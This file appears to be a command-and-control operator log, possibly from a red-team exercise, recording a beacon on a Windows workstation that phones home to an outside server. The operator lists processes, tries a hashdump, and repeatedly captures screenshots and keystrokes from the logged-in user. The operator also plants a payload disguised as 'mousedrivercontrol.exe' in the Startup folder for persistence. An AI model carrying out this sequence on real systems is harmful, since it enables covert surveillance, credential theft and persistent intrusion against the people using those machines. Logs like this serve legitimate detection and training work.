@@ -1,0 +1,531 @@
+03/30 07:55:47 UTC [metadata] 13.81.175.116 <- 10.1.3.10; computer: L-WIN223; user: w.tax; process: rundll32.exe; pid: 7872; os: Windows; version: 10.0; beacon arch: x86 (x64)
+03/30 07:56:16 UTC [input] <MarcS> ps
+03/30 07:56:16 UTC [task] <T1057> Tasked beacon to list processes
+03/30 07:56:18 UTC [checkin] host called home, sent: 12 bytes
+03/30 07:56:18 UTC [output]
+[System Process]	0	0
+System	0	4
+Registry	4	88
+smss.exe	4	404
+csrss.exe	496	512
+wininit.exe	496	588
+csrss.exe	580	596
+winlogon.exe	580	680
+services.exe	588	688
+lsass.exe	588	728
+svchost.exe	688	836
+fontdrvhost.exe	680	844
+fontdrvhost.exe	588	852
+svchost.exe	688	920
+svchost.exe	688	972
+svchost.exe	688	1012
+LogonUI.exe	680	496
+dwm.exe	680	756
+svchost.exe	688	1028
+svchost.exe	688	1040
+svchost.exe	688	1132
+svchost.exe	688	1140
+svchost.exe	688	1148
+svchost.exe	688	1156
+svchost.exe	688	1264
+svchost.exe	688	1304
+svchost.exe	688	1332
+svchost.exe	688	1368
+svchost.exe	688	1424
+svchost.exe	688	1464
+svchost.exe	688	1484
+svchost.exe	688	1620
+svchost.exe	688	1628
+svchost.exe	688	1732
+svchost.exe	688	1756
+svchost.exe	688	1772
+svchost.exe	688	1832
+taskhostw.exe	1132	1848
+svchost.exe	688	1872
+svchost.exe	688	1904
+svchost.exe	688	1924
+svchost.exe	688	2012
+svchost.exe	688	1528
+svchost.exe	688	1568
+svchost.exe	688	2052
+svchost.exe	688	2112
+svchost.exe	688	2240
+Memory Compression	4	2248
+svchost.exe	688	2284
+VSSVC.exe	688	2320
+svchost.exe	688	2384
+svchost.exe	688	2428
+svchost.exe	688	2448
+svchost.exe	688	2568
+svchost.exe	688	2656
+svchost.exe	688	2664
+svchost.exe	688	2672
+svchost.exe	688	2788
+svchost.exe	688	2796
+svchost.exe	688	2804
+svchost.exe	688	2920
+svchost.exe	688	2928
+spoolsv.exe	688	2512
+OfficeClickToRun.exe	688	3320
+sysmon64.exe	688	3328
+WaAppAgent.exe	688	3336
+WindowsAzureTelemetryService.exe	688	3344
+WindowsAzureGuestAgent.exe	688	3352
+WindowsAzureNetAgent.exe	688	3360
+svchost.exe	688	3368
+svchost.exe	688	3376
+svchost.exe	688	3384
+svchost.exe	688	3392
+svchost.exe	688	3400
+svchost.exe	688	3408
+svchost.exe	688	3416
+MsMpEng.exe	688	3424
+svchost.exe	688	3432
+svchost.exe	688	3796
+VFPlugin.exe	3360	3896
+conhost.exe	3896	3960
+unsecapp.exe	920	3236
+WmiPrvSE.exe	920	4104
+svchost.exe	688	4424
+svchost.exe	688	4468
+WmiPrvSE.exe	920	4712
+svchost.exe	688	4924
+svchost.exe	688	4960
+csrss.exe	5148	5156
+winlogon.exe	5148	5200
+fontdrvhost.exe	5200	5364
+dwm.exe	5200	5436
+svchost.exe	688	5628
+rdpclip.exe	1040	5988	x64	STROOP\w.tax	2
+sihost.exe	1484	6036	x64	STROOP\w.tax	2
+svchost.exe	688	6056	x64	STROOP\w.tax	2
+svchost.exe	688	6116	x64	STROOP\w.tax	2
+taskhostw.exe	1132	5312	x64	STROOP\w.tax	2
+svchost.exe	688	5592
+svchost.exe	688	4792
+ctfmon.exe	4792	5016	x64	STROOP\w.tax	2
+explorer.exe	6212	6236	x64	STROOP\w.tax	2
+svchost.exe	688	6252
+svchost.exe	688	6424	x64	STROOP\w.tax	2
+ShellExperienceHost.exe	920	6664	x64	STROOP\w.tax	2
+svchost.exe	688	6784
+SearchUI.exe	920	6832	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6956	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	7112	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6712	x64	STROOP\w.tax	2
+SearchIndexer.exe	688	6708
+svchost.exe	688	7208
+svchost.exe	688	7244
+svchost.exe	688	7316
+smartscreen.exe	920	7428	x64	STROOP\w.tax	2
+SecurityHealthSystray.exe	6236	7472	x64	STROOP\w.tax	2
+SecurityHealthService.exe	688	7512
+svchost.exe	688	7780
+WaSecAgentProv.exe	3336	5764
+conhost.exe	5764	6940
+SgrmBroker.exe	688	5720
+svchost.exe	688	1720
+svchost.exe	688	1992
+svchost.exe	688	2104	x64	STROOP\w.tax	2
+WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe	920	1456	x64	STROOP\w.tax	2
+dllhost.exe	920	3028	x64	STROOP\w.tax	2
+chrome.exe	6236	4396	x64	STROOP\w.tax	2
+svchost.exe	688	4752
+chrome.exe	4396	6272	x64	STROOP\w.tax	2
+chrome.exe	4396	5484	x64	STROOP\w.tax	2
+chrome.exe	4396	7688	x64	STROOP\w.tax	2
+chrome.exe	4396	7728	x64	STROOP\w.tax	2
+chrome.exe	4396	5080	x64	STROOP\w.tax	2
+POWERPNT.EXE	6236	6440	x86	STROOP\w.tax	2
+WmiPrvSE.exe	920	2008
+chrome.exe	4396	800	x64	STROOP\w.tax	2
+chrome.exe	4396	152	x64	STROOP\w.tax	2
+SearchProtocolHost.exe	6708	5552
+SearchFilterHost.exe	6708	6332
+WINWORD.EXE	2908	2212	x86	STROOP\w.tax	2
+rundll32.exe	2212	7872	x86	STROOP\w.tax	2
+svchost.exe	688	6472
+
+
+03/30 07:56:29 UTC [input] <MarcS> pwd
+03/30 07:56:29 UTC [task] <> Tasked beacon to print working directory
+03/30 07:56:32 UTC [checkin] host called home, sent: 8 bytes
+03/30 07:56:32 UTC [output]
+Current directory is C:\windows\system32
+
+03/30 07:56:47 UTC [input] <MarcS> hashdump
+03/30 07:56:47 UTC [error] hashdump error: this command requires administrator privileges
+03/30 07:57:03 UTC [input] <MarcS> screenshot
+03/30 07:57:03 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/30 07:57:05 UTC [checkin] host called home, sent: 162370 bytes
+03/30 07:57:07 UTC [output]
+received screenshot (200776 bytes)
+
+03/30 07:57:31 UTC [input] <MarcS> keylogger
+03/30 07:57:31 UTC [task] <T1056, T1093> Tasked beacon to log keystrokes
+03/30 07:57:35 UTC [checkin] host called home, sent: 65602 bytes
+03/30 07:58:09 UTC [output]
+received keystrokes
+
+03/30 07:58:19 UTC [output]
+received keystrokes
+
+03/30 07:58:24 UTC [input] <MarcS> screenshot
+03/30 07:58:24 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/30 07:58:29 UTC [checkin] host called home, sent: 162370 bytes
+03/30 07:58:30 UTC [output]
+received keystrokes
+
+03/30 07:58:30 UTC [output]
+received screenshot (223469 bytes)
+
+03/30 07:58:49 UTC [output]
+received keystrokes
+
+03/30 07:58:59 UTC [output]
+received keystrokes
+
+03/30 07:59:09 UTC [output]
+received keystrokes
+
+03/30 07:59:18 UTC [output]
+received keystrokes
+
+03/30 07:59:27 UTC [output]
+received keystrokes
+
+03/30 07:59:37 UTC [output]
+received keystrokes
+
+03/30 07:59:51 UTC [output]
+received keystrokes
+
+03/30 08:00:00 UTC [output]
+received keystrokes
+
+03/30 08:00:10 UTC [output]
+received keystrokes
+
+03/30 08:02:47 UTC [output]
+received keystrokes
+
+03/30 08:03:01 UTC [output]
+received keystrokes
+
+03/30 08:03:10 UTC [output]
+received keystrokes
+
+03/30 08:03:20 UTC [output]
+received keystrokes
+
+03/30 08:03:30 UTC [output]
+received keystrokes
+
+03/30 08:03:30 UTC [input] <MarcS> screenshot
+03/30 08:03:30 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/30 08:03:34 UTC [checkin] host called home, sent: 162370 bytes
+03/30 08:03:35 UTC [output]
+received screenshot (242880 bytes)
+
+03/30 08:03:50 UTC [input] <MarcS> jobs
+03/30 08:03:50 UTC [task] <> Tasked beacon to list jobs
+03/30 08:03:55 UTC [checkin] host called home, sent: 8 bytes
+03/30 08:03:55 UTC [output]
+1	0	keystroke logger
+
+
+03/30 08:04:51 UTC [input] <MarcS> cd c:\users
+03/30 08:04:51 UTC [task] <> cd c:\users
+03/30 08:04:52 UTC [checkin] host called home, sent: 16 bytes
+03/30 08:04:55 UTC [input] <MarcS> pwd
+03/30 08:04:55 UTC [task] <> Tasked beacon to print working directory
+03/30 08:04:57 UTC [checkin] host called home, sent: 8 bytes
+03/30 08:04:57 UTC [output]
+Current directory is c:\users
+
+03/30 08:04:58 UTC [input] <MarcS> ls
+03/30 08:04:58 UTC [task] <> Tasked beacon to list files in .
+03/30 08:05:01 UTC [checkin] host called home, sent: 19 bytes
+03/30 08:05:01 UTC [output]
+c:\users\*
+D	0	03/29/2020 11:36:14	.
+D	0	03/29/2020 11:36:14	..
+D	0	09/15/2018 07:42:33	All Users
+D	0	03/29/2020 10:17:23	bofh
+D	0	03/29/2020 11:22:00	bofh.STROOP
+D	0	03/07/2020 10:40:02	Default
+D	0	09/15/2018 07:42:33	Default User
+F	174	09/15/2018 07:31:34	desktop.ini
+D	0	03/07/2020 10:35:06	Public
+D	0	03/29/2020 11:36:22	w.tax
+
+
+03/30 08:05:48 UTC [input] <MarcS> cd w.tax\AppData\Roaming\Microsoft\Windows\
+03/30 08:05:48 UTC [task] <> cd w.tax\AppData\Roaming\Microsoft\Windows\
+03/30 08:05:49 UTC [input] <MarcS> ls
+03/30 08:05:49 UTC [task] <> Tasked beacon to list files in .
+03/30 08:05:49 UTC [checkin] host called home, sent: 67 bytes
+03/30 08:05:49 UTC [output]
+c:\users\w.tax\AppData\Roaming\Microsoft\Windows\*
+D	0	03/29/2020 11:36:24	.
+D	0	03/29/2020 11:36:24	..
+D	0	03/29/2020 11:36:22	AccountPictures
+D	0	09/15/2018 07:33:50	CloudStore
+D	0	03/29/2020 11:36:22	Libraries
+D	0	09/15/2018 07:33:50	Network Shortcuts
+D	0	09/15/2018 07:33:50	Printer Shortcuts
+D	0	03/30/2020 07:58:17	Recent
+D	0	03/29/2020 11:37:29	SendTo
+D	0	03/29/2020 11:36:22	Start Menu
+D	0	09/15/2018 07:33:50	Templates
+D	0	03/30/2020 07:45:52	Themes
+
+
+03/30 08:05:54 UTC [input] <MarcS> cd Start Menu
+03/30 08:05:54 UTC [task] <> cd Start Menu
+03/30 08:05:54 UTC [checkin] host called home, sent: 18 bytes
+03/30 08:05:56 UTC [input] <MarcS> ls
+03/30 08:05:56 UTC [task] <> Tasked beacon to list files in .
+03/30 08:05:59 UTC [checkin] host called home, sent: 19 bytes
+03/30 08:05:59 UTC [output]
+c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\*
+D	0	03/29/2020 11:36:22	.
+D	0	03/29/2020 11:36:22	..
+F	174	03/29/2020 11:36:22	desktop.ini
+D	0	03/29/2020 11:36:22	Programs
+
+
+03/30 08:06:03 UTC [input] <MarcS> cd Programs
+03/30 08:06:03 UTC [task] <> cd Programs
+03/30 08:06:04 UTC [input] <MarcS> ls
+03/30 08:06:04 UTC [task] <> Tasked beacon to list files in .
+03/30 08:06:04 UTC [checkin] host called home, sent: 35 bytes
+03/30 08:06:04 UTC [output]
+c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\*
+D	0	03/29/2020 11:36:22	.
+D	0	03/29/2020 11:36:22	..
+D	0	03/07/2020 00:55:56	Accessibility
+D	0	03/29/2020 11:36:21	Accessories
+D	0	03/29/2020 11:36:22	Administrative Tools
+F	174	03/29/2020 11:36:22	desktop.ini
+D	0	09/15/2018 07:33:54	Maintenance
+D	0	03/29/2020 11:36:22	Startup
+D	0	09/15/2018 07:33:54	System Tools
+D	0	09/15/2018 07:34:10	Windows PowerShell
+
+
+03/30 08:06:08 UTC [input] <MarcS> cd Startup
+03/30 08:06:08 UTC [task] <> cd Startup
+03/30 08:06:09 UTC [checkin] host called home, sent: 15 bytes
+03/30 08:07:20 UTC [input] <MarcS> upload /Users/marcs/mousedrivercontrol.exe
+03/30 08:07:20 UTC [task] <> Tasked beacon to upload /Users/marcs/mousedrivercontrol.exe as mousedrivercontrol.exe
+03/30 08:07:20 UTC [indicator] file: 351274f85af9b22f88152ceb80456dd0 289280 bytes mousedrivercontrol.exe
+03/30 08:07:21 UTC [checkin] host called home, sent: 289314 bytes
+03/30 08:07:37 UTC [input] <MarcS> ls
+03/30 08:07:37 UTC [task] <> Tasked beacon to list files in .
+03/30 08:07:40 UTC [checkin] host called home, sent: 19 bytes
+03/30 08:07:40 UTC [output]
+c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*
+D	0	03/30/2020 08:07:21	.
+D	0	03/30/2020 08:07:21	..
+F	174	03/29/2020 11:36:22	desktop.ini
+F	289280	03/30/2020 08:07:21	mousedrivercontrol.exe
+
+
+03/30 08:07:56 UTC [input] <MarcS> run mousedrivercontrol.exe
+03/30 08:07:56 UTC [task] <T1059> Tasked beacon to run: mousedrivercontrol.exe
+03/30 08:07:59 UTC [checkin] host called home, sent: 40 bytes
+03/30 08:08:13 UTC [input] <MarcS> ps
+03/30 08:08:13 UTC [task] <T1057> Tasked beacon to list processes
+03/30 08:08:13 UTC [checkin] host called home, sent: 12 bytes
+03/30 08:08:13 UTC [output]
+[System Process]	0	0
+System	0	4
+Registry	4	88
+smss.exe	4	404
+csrss.exe	496	512
+wininit.exe	496	588
+csrss.exe	580	596
+winlogon.exe	580	680
+services.exe	588	688
+lsass.exe	588	728
+svchost.exe	688	836
+fontdrvhost.exe	680	844
+fontdrvhost.exe	588	852
+svchost.exe	688	920
+svchost.exe	688	972
+svchost.exe	688	1012
+LogonUI.exe	680	496
+dwm.exe	680	756
+svchost.exe	688	1040
+svchost.exe	688	1132
+svchost.exe	688	1140
+svchost.exe	688	1148
+svchost.exe	688	1156
+svchost.exe	688	1264
+svchost.exe	688	1304
+svchost.exe	688	1332
+svchost.exe	688	1368
+svchost.exe	688	1424
+svchost.exe	688	1464
+svchost.exe	688	1484
+svchost.exe	688	1620
+svchost.exe	688	1628
+svchost.exe	688	1732
+svchost.exe	688	1756
+svchost.exe	688	1772
+svchost.exe	688	1832
+taskhostw.exe	1132	1848
+svchost.exe	688	1872
+svchost.exe	688	1904
+svchost.exe	688	1924
+svchost.exe	688	2012
+svchost.exe	688	1528
+svchost.exe	688	1568
+svchost.exe	688	2052
+svchost.exe	688	2112
+svchost.exe	688	2240
+Memory Compression	4	2248
+svchost.exe	688	2284
+VSSVC.exe	688	2320
+svchost.exe	688	2384
+svchost.exe	688	2428
+svchost.exe	688	2448
+svchost.exe	688	2568
+svchost.exe	688	2656
+svchost.exe	688	2664
+svchost.exe	688	2672
+svchost.exe	688	2788
+svchost.exe	688	2796
+svchost.exe	688	2804
+svchost.exe	688	2920
+svchost.exe	688	2928
+spoolsv.exe	688	2512
+OfficeClickToRun.exe	688	3320
+sysmon64.exe	688	3328
+WaAppAgent.exe	688	3336
+WindowsAzureTelemetryService.exe	688	3344
+WindowsAzureGuestAgent.exe	688	3352
+WindowsAzureNetAgent.exe	688	3360
+svchost.exe	688	3368
+svchost.exe	688	3376
+svchost.exe	688	3384
+svchost.exe	688	3392
+svchost.exe	688	3400
+svchost.exe	688	3408
+svchost.exe	688	3416
+MsMpEng.exe	688	3424
+svchost.exe	688	3432
+svchost.exe	688	3796
+VFPlugin.exe	3360	3896
+conhost.exe	3896	3960
+unsecapp.exe	920	3236
+WmiPrvSE.exe	920	4104
+svchost.exe	688	4424
+WmiPrvSE.exe	920	4712
+svchost.exe	688	4924
+svchost.exe	688	4960
+csrss.exe	5148	5156
+winlogon.exe	5148	5200
+fontdrvhost.exe	5200	5364
+dwm.exe	5200	5436
+svchost.exe	688	5628
+rdpclip.exe	1040	5988	x64	STROOP\w.tax	2
+sihost.exe	1484	6036	x64	STROOP\w.tax	2
+svchost.exe	688	6056	x64	STROOP\w.tax	2
+svchost.exe	688	6116	x64	STROOP\w.tax	2
+taskhostw.exe	1132	5312	x64	STROOP\w.tax	2
+svchost.exe	688	5592
+svchost.exe	688	4792
+ctfmon.exe	4792	5016	x64	STROOP\w.tax	2
+explorer.exe	6212	6236	x64	STROOP\w.tax	2
+svchost.exe	688	6252
+svchost.exe	688	6424	x64	STROOP\w.tax	2
+ShellExperienceHost.exe	920	6664	x64	STROOP\w.tax	2
+svchost.exe	688	6784
+SearchUI.exe	920	6832	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6956	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	7112	x64	STROOP\w.tax	2
+RuntimeBroker.exe	920	6712	x64	STROOP\w.tax	2
+SearchIndexer.exe	688	6708
+svchost.exe	688	7208
+svchost.exe	688	7244
+svchost.exe	688	7316
+smartscreen.exe	920	7428	x64	STROOP\w.tax	2
+SecurityHealthSystray.exe	6236	7472	x64	STROOP\w.tax	2
+SecurityHealthService.exe	688	7512
+svchost.exe	688	7780
+WaSecAgentProv.exe	3336	5764
+conhost.exe	5764	6940
+SgrmBroker.exe	688	5720
+svchost.exe	688	1720
+svchost.exe	688	1992
+svchost.exe	688	2104	x64	STROOP\w.tax	2
+WindowsInternal.ComposableShell.Experiences.TextInput.InputApp.exe	920	1456	x64	STROOP\w.tax	2
+dllhost.exe	920	3028	x64	STROOP\w.tax	2
+chrome.exe	6236	4396	x64	STROOP\w.tax	2
+svchost.exe	688	4752
+chrome.exe	4396	6272	x64	STROOP\w.tax	2
+chrome.exe	4396	5484	x64	STROOP\w.tax	2
+chrome.exe	4396	7688	x64	STROOP\w.tax	2
+chrome.exe	4396	7728	x64	STROOP\w.tax	2
+chrome.exe	4396	5080	x64	STROOP\w.tax	2
+POWERPNT.EXE	6236	6440	x86	STROOP\w.tax	2
+chrome.exe	4396	800	x64	STROOP\w.tax	2
+chrome.exe	4396	152	x64	STROOP\w.tax	2
+WINWORD.EXE	2908	2212	x86	STROOP\w.tax	2
+rundll32.exe	2212	7872	x86	STROOP\w.tax	2
+rundll32.exe	7872	3816	x86	STROOP\w.tax	2
+MSOSYNC.EXE	6440	1644	x86	STROOP\w.tax	2
+svchost.exe	688	3724
+svchost.exe	688	64
+svchost.exe	688	3728
+TrustedInstaller.exe	688	2540
+TiWorker.exe	920	4692
+svchost.exe	688	7660
+svchost.exe	688	4356
+
+
+03/30 08:08:45 UTC [input] <MarcS> run c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mousedrivercontrol.exe
+03/30 08:08:45 UTC [task] <T1059> Tasked beacon to run: c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mousedrivercontrol.exe
+03/30 08:08:46 UTC [checkin] host called home, sent: 117 bytes
+03/30 08:09:48 UTC [output]
+received keystrokes
+
+03/30 08:09:58 UTC [output]
+received keystrokes
+
+03/30 08:10:07 UTC [output]
+received keystrokes
+
+03/30 08:10:45 UTC [input] <MarcS> jobkill 1
+03/30 08:10:45 UTC [task] <> Tasked beacon to kill job 1
+03/30 08:10:45 UTC [checkin] host called home, sent: 10 bytes
+03/30 08:10:48 UTC [input] <MarcS> jobs
+03/30 08:10:48 UTC [task] <> Tasked beacon to list jobs
+03/30 08:10:50 UTC [checkin] host called home, sent: 8 bytes
+03/30 08:10:50 UTC [output]
+
+
+03/30 08:13:29 UTC [input] <MarcS> upload /Users/marcs/mousedrivercontrol.exe
+03/30 08:13:30 UTC [task] <> Tasked beacon to upload /Users/marcs/mousedrivercontrol.exe as mousedrivercontrol.exe
+03/30 08:13:30 UTC [indicator] file: 4c859c9ba229c6018c91eb00d075674a 288256 bytes mousedrivercontrol.exe
+03/30 08:13:32 UTC [checkin] host called home, sent: 288290 bytes
+03/30 08:13:35 UTC [input] <MarcS> ls
+03/30 08:13:35 UTC [task] <> Tasked beacon to list files in .
+03/30 08:13:37 UTC [checkin] host called home, sent: 19 bytes
+03/30 08:13:37 UTC [output]
+c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\*
+D	0	03/30/2020 08:07:21	.
+D	0	03/30/2020 08:07:21	..
+F	174	03/29/2020 11:36:22	desktop.ini
+F	288256	03/30/2020 08:13:32	mousedrivercontrol.exe
+
+
+03/30 08:13:45 UTC [input] <MarcS> run c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mousedrivercontrol.exe
+03/30 08:13:45 UTC [task] <T1059> Tasked beacon to run: c:\users\w.tax\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\mousedrivercontrol.exe
+03/30 08:13:46 UTC [checkin] host called home, sent: 117 bytes
+03/30 08:14:20 UTC [input] <MarcS> sleep 30 5
+03/30 08:14:20 UTC [task] <T1029> Tasked beacon to sleep for 30s (5% jitter)
+03/30 08:14:20 UTC [checkin] host called home, sent: 16 bytes
+03/30 08:41:54 UTC [input] <MarcS> note beacon initial access
